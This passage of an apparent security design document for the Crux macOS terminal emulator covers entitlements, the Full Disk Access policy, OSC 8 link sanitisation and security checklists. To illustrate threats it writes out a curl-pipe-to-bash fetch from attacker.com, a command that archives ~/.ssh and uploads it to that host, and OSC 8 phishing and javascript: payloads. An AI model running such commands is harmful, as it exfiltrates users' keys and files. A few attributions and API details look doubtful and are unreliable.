                }
            );
        }

        response.granted
    }
}
```

---

### Visual Feedback

**Clipboard access indicator**: Show icon in status bar when clipboard is read/written:

```
┌─────────────────────────────────────────────┐
│ [📋 Clipboard accessed by vim]              │
│                                             │
│ $ vim file.txt                              │
│ ...                                         │
└─────────────────────────────────────────────┘
```

**Active dangerous mode indicator**: Show warning when title reporting is enabled:

```
┌─────────────────────────────────────────────┐
│ ⚠️ Title reporting enabled (security risk)  │
│                                             │
│ $ ...                                       │
└─────────────────────────────────────────────┘
```

---

## 9. macOS-Specific Security

macOS provides platform-specific security features that Crux must leverage.

### Secure Keyboard Entry

**Purpose**: Prevent keyloggers and other apps from reading keyboard input sent to the terminal.

**API**: Carbon `EnableSecureEventInput()` / `DisableSecureEventInput()`

```c
#include <Carbon/Carbon.h>

void enable_secure_input(void) {
    EnableSecureEventInput();
}

void disable_secure_input(void) {
    DisableSecureEventInput();
}
```

**Effect**:
- When enabled, keyboard events are delivered ONLY to the secure app
- Other apps (including accessibility tools) cannot intercept keystrokes
- System shows padlock icon in menu bar

**Trade-offs**:
- Breaks password managers (they cannot auto-type)
- Breaks accessibility tools (screen readers cannot see input)
- Breaks clipboard managers (cannot capture typed text)

**Recommendation**: Provide as **opt-in menu option** (Terminal.app does this):

```
View → Secure Keyboard Entry
```

iTerm2 provides this as a preference with warning:

> "Secure Keyboard Entry prevents other applications from observing your keystrokes. However, it also disables many features like password managers and accessibility tools."

---

### Hardened Runtime

**What it is**: macOS security feature that restricts runtime code manipulation.

**Required for**: Notarization on macOS 10.14+

**What it prevents**:
- JIT compilation (unless explicitly entitled)
- Loading unsigned code (DLLs, plugins)
- Code injection
- Debugger attachment (unless explicitly entitled)
- DTrace tracing (unless explicitly entitled)

**Impact on Crux**: GPUI uses Metal shaders, which are compiled at runtime. This requires the `com.apple.security.cs.allow-unsigned-executable-memory` entitlement.

---

### Required Entitlements for Crux

**entitlements.plist**:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Allow Metal shader compilation (required for GPUI) -->
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>

    <!-- Allow debugging (development only, remove for release) -->
    <key>com.apple.security.cs.allow-debugger</key>
    <true/>

    <!-- Allow DTrace (development only, remove for release) -->
    <key>com.apple.security.cs.allow-dtrace</key>
    <true/>

    <!-- Network access (for SSH, update checks, etc.) -->
    <key>com.apple.security.network.client</key>
    <true/>

    <!-- IMPORTANT: Do NOT request these entitlements -->
    <!--
    <key>com.apple.security.temporary-exception.apple-events</key>
    <false/>
    <key>com.apple.security.automation.apple-events</key>
    <false/>
    <key>com.apple.security.files.user-selected.read-write</key>
    <false/>
    -->
</dict>
</plist>
```

**Signing command**:

```bash
codesign --sign "Developer ID Application: Your Name (TEAM_ID)" \
         --entitlements entitlements.plist \
         --options runtime \
         --timestamp \
         --deep \
         --force \
         Crux.app
```

**Critical flags**:
- `--options runtime`: Enable Hardened Runtime
- `--timestamp`: Include secure timestamp (required for notarization)
- `--deep`: Sign all nested code (frameworks, plugins)

---

### Full Disk Access (FDA): DO NOT REQUEST

**What it is**: macOS privacy feature that controls access to protected locations:
- `~/Documents`
- `~/Desktop`
- `~/Downloads`
- `~/Library`
- `/Library/Application Support`
- External volumes

**How apps request it**: By adding `NSDesktopFolderUsageDescription` to Info.plist and prompting user in System Settings → Privacy & Security → Full Disk Access.

**Why terminals are tempting to grant FDA**:
- Users want `cd ~/Desktop` to work
- Users want `open ~/Documents/file.txt` to work
- System prompts "Crux.app would like to access Desktop folder"

**THE DANGER**: Granting FDA to a terminal emulator grants FDA to **EVERY UNSANDBOXED PROGRAM** run inside it.

**Example attack**:
```bash
# User grants FDA to Crux
# Attacker gets user to run:
curl attacker.com/evil.sh | bash

# evil.sh now has FULL DISK ACCESS:
tar czf ~/exfiltrate.tar.gz ~/Documents ~/Desktop ~/.ssh
curl -F file=@~/exfiltrate.tar.gz attacker.com/upload
```

**iTerm2's stance**:

> "iTerm2 does not and will not ever request Full Disk Access. Doing so would be a security catastrophe. Users should grant FDA only to specific tools (IDEs, backup software) that need it, never to terminals."

**Crux policy**: **NEVER request Full Disk Access.** Document this clearly:

```markdown
# Why doesn't Crux request Full Disk Access?

Granting Full Disk Access to a terminal emulator would allow every program
run inside the terminal to access your entire file system, including:
- SSH keys (~/.ssh)
- Browser history
- Email
- Photos
- Documents

This is a security catastrophe. Instead:
- Use Finder to select files and drag them into Crux
- Use specific tools (IDEs) that request FDA only for themselves
- Never grant FDA to terminal emulators
```

---

### Code Signing and Notarization

**Required for**:
- Gatekeeper approval (macOS 10.15+)
- No "unverified developer" warning
- Distribution outside Mac App Store

**Process**:
1. Code sign with Developer ID certificate + Hardened Runtime
2. Create DMG or PKG installer
3. Sign the installer
4. Upload to Apple's notary service: `xcrun notarytool submit Crux.dmg`
5. Wait for approval (usually < 10 minutes)
6. Staple the notarization ticket: `xcrun stapler staple Crux.dmg`

**See also**: `research/platform/homebrew-distribution.md` for Homebrew Cask notarization requirements.

---

## 10. OSC 8 Hyperlink Security

OSC 8 allows terminal output to contain clickable URLs:

```
OSC 8 ; <params> ; <URL> ST <text> OSC 8 ;; ST

Example:
printf '\e]8;;https://example.com\e\\Click here\e]8;;\e\\\n'
```

**Security risks**:

1. **Phishing**: Display text does not match URL
   ```
   printf '\e]8;;https://attacker.com\e\\https://trusted-bank.com\e]8;;\e\\\n'
   # User sees "https://trusted-bank.com" but click goes to attacker.com
   ```

2. **Dangerous schemes**: `javascript:`, `file:`, `data:` URLs
   ```
   printf '\e]8;;javascript:alert(document.cookie)\e\\Click me\e]8;;\e\\\n'
   ```

3. **URL injection**: Long URLs can push text off screen, hiding malicious domain

---

### Defense Strategies

| Defense | Implementation |
|---------|----------------|
| **URL sanitization** | Reject `javascript:`, `file:`, `data:` schemes; allow only `http:`, `https:`, `mailto:`, `ssh:`, `tel:` |
| **URL length limit** | Max 2048 characters (match browsers) |
| **Hover preview** | Show actual URL on mouseover (like browsers) |
| **Visual distinction** | Underline links, different color |
| **Disable option** | Allow users to disable clickable links entirely |
| **Confirm dialog** | Prompt before opening `ssh:` or non-http URLs |

---

### Implementation

```rust
pub struct HyperlinkPolicy {
    enabled: bool,
    allowed_schemes: Vec<String>,
    max_url_length: usize,
    show_confirm_dialog: bool,
}

impl Default for HyperlinkPolicy {
    fn default() -> Self {
        Self {
            enabled: true,
            allowed_schemes: vec![
                "http".into(),
                "https".into(),
                "mailto".into(),
            ],
            max_url_length: 2048,
            show_confirm_dialog: false,
        }
    }
}

impl HyperlinkPolicy {
    pub fn validate_url(&self, url: &str) -> Result<Url, SecurityError> {
        // Length check
        if url.len() > self.max_url_length {
            return Err(SecurityError::UrlTooLong);
        }

        // Parse and validate scheme
        let parsed = Url::parse(url)
            .map_err(|_| SecurityError::InvalidUrl)?;

        if !self.allowed_schemes.contains(&parsed.scheme().to_string()) {
            return Err(SecurityError::DisallowedScheme(parsed.scheme().to_string()));
        }

        Ok(parsed)
    }

    pub fn handle_click(&self, url: &Url) -> ClickAction {
        match url.scheme() {
            "http" | "https" => {
                // Open in default browser
                ClickAction::OpenBrowser(url.clone())
            }
            "mailto" => {
                // Open in default mail client
                ClickAction::OpenMailClient(url.clone())
            }
            "ssh" => {
                if self.show_confirm_dialog {
                    ClickAction::ConfirmThenConnect(url.clone())
                } else {
                    ClickAction::Connect(url.clone())
                }
            }
            _ => ClickAction::Ignore,
        }
    }
}
```

---

### Hover Preview UI

```rust
pub struct HyperlinkHoverState {
    hovered_url: Option<Url>,
    hover_position: Point,
}

impl HyperlinkHoverState {
    pub fn render_tooltip(&self, cx: &mut WindowContext) {
        if let Some(url) = &self.hovered_url {
            // Show tooltip with actual URL
            Tooltip::new("Link destination")
                .child(div().child(url.as_str()))
                .render_at(self.hover_position, cx);
        }
    }
}
```

**Visual example**:

```
┌─────────────────────────────────────────────┐
│ $ ls                                        │
│ README.md  src/  target/                    │
│                                             │
│ Download: [example.com/file.zip]           │
│            ▲                                │
│            │                                │
│    ┌───────────────────────────┐           │
│    │ https://evil.com/malware  │           │
│    └───────────────────────────┘           │
│         Actual link destination            │
└─────────────────────────────────────────────┘
```

---

## 11. Rust Memory Safety Benefits

Rust eliminates entire classes of vulnerabilities that plague C/C++ terminals.

### Vulnerabilities Prevented by Rust

| Vulnerability Class | C/C++ Example | Rust Prevention |
|---------------------|---------------|-----------------|
| **Buffer overflow** | kvt title overflow (CVE-1999-0918) | Bounds checking, `Vec<T>` auto-grows |
| **Use-after-free** | VTE double-free bugs | Ownership system prevents |
| **Null pointer dereference** | Countless terminal crashes | `Option<T>` forces handling |
| **Integer overflow** | Dimension calculation overflows | Checked arithmetic in debug, wrapping explicit |
| **Data races** | Concurrent rendering bugs | `Send`/`Sync` trait enforcement |
| **Uninitialized memory** | Stack variable read before write | Compiler enforces initialization |

---

### alacritty_terminal: Battle-Tested Foundation

Crux uses `alacritty_terminal` (the VT emulation core extracted from Alacritty terminal). Benefits:

1. **5+ years of production use**: Alacritty is one of the most popular terminals
2. **Extensive fuzzing**: AFL-fuzzed parser, discovered and fixed edge cases
3. **Memory safety**: Written in Rust, zero memory corruption bugs
4. **vte crate**: Uses Paul Williams' state machine parser (industry standard)
5. **Active maintenance**: Regular updates for new escape sequences

**Example**: Alacritty had an early bug where extremely long OSC sequences could cause panic. This was fixed in `alacritty_terminal` by adding length limits, and Crux inherits this fix.

---

### vte Crate: Structural Parser

The `vte` crate implements [Paul Williams' VT100 parser](https://vt100.net/emu/dec_ansi_parser), a state machine approach that guarantees:

- **No parser confusion**: Malformed sequences cannot transition to dangerous states
- **Incremental parsing**: Process one byte at a time, no buffering vulnerabilities
- **UTF-8 safe**: Proper Unicode validation before passing to application

**State machine example**:

```
Ground ──[ESC]──> Escape ──[[]──> CsiEntry ──[0-9]──> CsiParam
                           │
                           └─[P]──> DcsEntry ──[printable]──> DcsPassthrough
```

Malicious input like `ESC [ ESC P` (incomplete CSI followed by DCS start) is handled correctly:
1. Ground → Escape (on ESC)
2. Escape → CsiEntry (on `[`)
3. CsiEntry → Escape (on ESC, abort CSI)
4. Escape → DcsEntry (on P)

No undefined behavior, no buffer overflows, no state corruption.

---

### Thread Safety for Concurrent Rendering

Crux uses GPUI's concurrent rendering model:
- Parsing happens on PTY reader thread
- Rendering happens on GPU thread
- User input happens on event thread

**Rust prevents data races**:

```rust
// TerminalState must be Send + Sync to share across threads
pub struct TerminalState {
    grid: Arc<Mutex<Grid>>,
    damage: Arc<Mutex<TermDamage>>,
    // ...
}

// Compiler enforces:
// - Only one thread can mutate grid at a time (Mutex)
// - No use-after-free (Arc tracks references)
// - No data races (Send/Sync traits)
```

C++ terminals often have race conditions in concurrent rendering (screen tearing, use-after-free on grid resize). Rust makes these impossible.

---

## 12. Crux Security Recommendations Summary

### Default Security Posture

| Feature | Default Policy | Rationale |
|---------|---------------|-----------|
| **Title reporting** | DISABLED | Prevents CVE-2024-56803 style attacks |
| **Clipboard write** | ENABLED | Legitimate use case (vim yank over SSH) |
| **Clipboard read** | PROMPT | High risk of credential exfiltration |
| **Bracketed paste** | ENABLED with filtering | Prevents command injection |
| **OSC 8 hyperlinks** | ENABLED with URL sanitization | Useful feature, low risk with validation |
| **DCS sequences** | Graphics + queries only | Balance security and functionality |
| **APC/PM/SOS** | DISABLED | No legitimate use cases |
| **C1 controls** | REJECTED in UTF-8 mode | Prevents encoding bypass attacks |
| **Secure Keyboard Entry** | OPT-IN menu option | Breaks too many workflows for default |
| **Full Disk Access** | NEVER REQUEST | Security catastrophe |

---

### Three-Tier Input Sanitization

```rust
// Tier 1: Structural (vte crate)
let mut parser = vte::Parser::new();
parser.advance(&mut performer, byte);  // Validates UTF-8, state machine

// Tier 2: Length limits
if osc_buffer.len() > MAX_OSC_LENGTH {
    return Err(SecurityError::SequenceTooLong);
}

// Tier 3: Semantic filtering
if !security_policy.allow_sequence(&seq, trust_level) {
    return Err(SecurityError::SequenceBlocked);
}
```

---

### Trust-Based Policy Matrix

| Sequence | Local Shell | Trusted SSH | Untrusted Program |
|----------|-------------|-------------|-------------------|
| Set title (OSC 0/1/2) | ✅ Allow | ✅ Allow | ✅ Allow |
| Report title (CSI 21 t) | ⚠️ Configurable (default deny) | ❌ Deny | ❌ Deny |
| Clipboard write (OSC 52 write) | ✅ Allow | ✅ Allow | ✅ Allow |
| Clipboard read (OSC 52 read) | 🔐 Prompt | 🔐 Prompt | 🔐 Prompt |
| Hyperlinks (OSC 8) | ✅ Allow | ✅ Allow | ✅ Allow |
| Sixel graphics (DCS q) | ✅ Allow | ✅ Allow | ✅ Allow |
| DECRQSS query (DCS $ q) | ✅ Allow | ⚠️ Configurable | ❌ Deny |
| APC sequences | ❌ Deny | ❌ Deny | ❌ Deny |

---

### Security Checklist for Phase 1 (Basic Terminal)

- [ ] Use `vte` crate for parsing (do NOT write custom parser)
- [ ] Enforce length limits on OSC (100KB), DCS (100KB), title (2KB)
- [ ] Timeout incomplete sequences (5 seconds)
- [ ] Reject C1 controls in UTF-8 mode
- [ ] Filter bracketed paste content (strip ESC, C0/C1, embedded end markers)
- [ ] Enable bracketed paste by default
- [ ] Disable title reporting by default
- [ ] Implement clipboard write, prompt for clipboard read
- [ ] Sanitize OSC 8 URLs (reject javascript:, file:, data:)
- [ ] Show URL on hover for OSC 8 links

---

### Security Checklist for Phase 5 (Production Hardening)

- [ ] Trust-based policy system (Local/Trusted/Untrusted)
- [ ] Visual indicators for clipboard access
- [ ] Security audit log (suspicious sequences)
- [ ] Rate limiting (max N sequences per second)
- [ ] Secure Keyboard Entry menu option
- [ ] Hardened Runtime with minimal entitlements
- [ ] Code signing + notarization
- [ ] Documentation: Why we don't request FDA
- [ ] Penetration testing with malicious escape sequences
- [ ] CVE monitoring and response plan

---

### Security Checklist for Phase 6 (Distribution)

- [ ] Sign with Developer ID certificate
- [ ] Staple notarization ticket to DMG
- [ ] Document entitlements in README
- [ ] Provide security.txt (IETF RFC 9116) with contact info
- [ ] Set up vulnerability disclosure process
- [ ] Enable automatic updates with signature verification
- [ ] Provide SHA256 checksums for downloads
- [ ] Document security architecture in user-facing docs

---

## 13. References

### CVE Databases and Advisories

- **NVD CVE-2024-56803 (Ghostty)**: https://nvd.nist.gov/vuln/detail/CVE-2024-56803
- **Ghostty Security Advisory**: https://github.com/ghostty-org/ghostty/security/advisories/GHSA-9393-r5h6-94c9
- **NVD CVE-2021-31701 (MinTTY)**: https://nvd.nist.gov/vuln/detail/CVE-2021-31701
- **OSS-Security MinTTY Analysis**: https://www.openwall.com/lists/oss-security/2021/05/11/2
- **NVD CVE-2021-37326 (Xshell)**: https://nvd.nist.gov/vuln/detail/CVE-2021-37326
- **NVD CVE-2021-40147 (ZOC)**: https://nvd.nist.gov/vuln/detail/CVE-2021-40147
- **NVD CVE-2022-45872 (iTerm2)**: https://nvd.nist.gov/vuln/detail/CVE-2022-45872
- **BugTraq kvt 1999**: https://seclists.org/bugtraq/1999/Oct/0

---

### Comprehensive Analyses

- **Daniel Gruss: Terminal Emulator Security (2023)**: https://dgl.cx/2023/09/ansi-terminal-security
  - Comprehensive analysis of 10 CVEs discovered in 2023
  - Attack patterns and mitigation strategies
  - Required reading for terminal security

- **Marc Prud'hommeaux: Terminal Escape Sequence Attacks**: https://marc.info/?l=bugtraq&m=104612710031920&w=2
  - Historic overview of terminal attacks
  - Echoback attack examples

---

### Terminal-Specific Documentation

- **Kitty Security**: https://sw.kovidgoyal.net/kitty/conf/#opt-kitty.clipboard_control
- **iTerm2 Security Features**: https://iterm2.com/documentation-preferences-general.html
- **xterm Security**: https://invisible-island.net/xterm/manpage/xterm.html#VT100-Widget-Resources:allowWindowOps
- **Alacritty Security Issues**: https://github.com/alacritty/alacritty/issues?q=label%3Asecurity
- **WezTerm Security**: https://wezfurlong.org/wezterm/config/lua/config/allow_win32_input_mode.html

---

### Standards and Specifications

- **ECMA-48 (ISO/IEC 6429)**: Control Functions for Coded Character Sets
  - http://www.ecma-international.org/publications/standards/Ecma-048.htm
- **Paul Williams VT100 Parser**: https://vt100.net/emu/dec_ansi_parser
  - State machine approach to escape sequence parsing
- **XTerm Control Sequences**: https://invisible-island.net/xterm/ctlseqs/ctlseqs.html
  - Comprehensive reference for all escape sequences

---

### macOS Security

- **Apple Developer: Hardened Runtime**: https://developer.apple.com/documentation/security/hardened_runtime
- **Apple Developer: Entitlements**: https://developer.apple.com/documentation/bundleresources/entitlements
- **Apple Developer: Notarization**: https://developer.apple.com/documentation/security/notarizing_macos_software_before_distribution
- **Apple Developer: Code Signing**: https://developer.apple.com/library/archive/documentation/Security/Conceptual/CodeSigningGuide/
- **Secure Keyboard Entry**: https://support.apple.com/guide/terminal/use-secure-keyboard-entry-trml109/mac

---

### Rust Security

- **vte crate**: https://docs.rs/vte/
  - Paul Williams' parser in Rust
- **alacritty_terminal crate**: https://docs.rs/alacritty_terminal/
  - Production-grade VT emulator
- **Rust Security Guidelines**: https://anssi-fr.github.io/rust-guide/
  - French cybersecurity agency's Rust security guide

---

### General Security Resources

- **OWASP Cheat Sheet: Input Validation**: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
- **IETF RFC 9116: security.txt**: https://www.rfc-editor.org/rfc/rfc9116.html
  - Standard for vulnerability disclosure
- **CWE-117: Improper Output Neutralization for Logs**: https://cwe.mitre.org/data/definitions/117.html
  - Relevant for escape sequence injection in logs

---

**Last updated**: 2026-02-12
**Next review**: Before Phase 5 implementation
**Owned by**: Crux Security Team
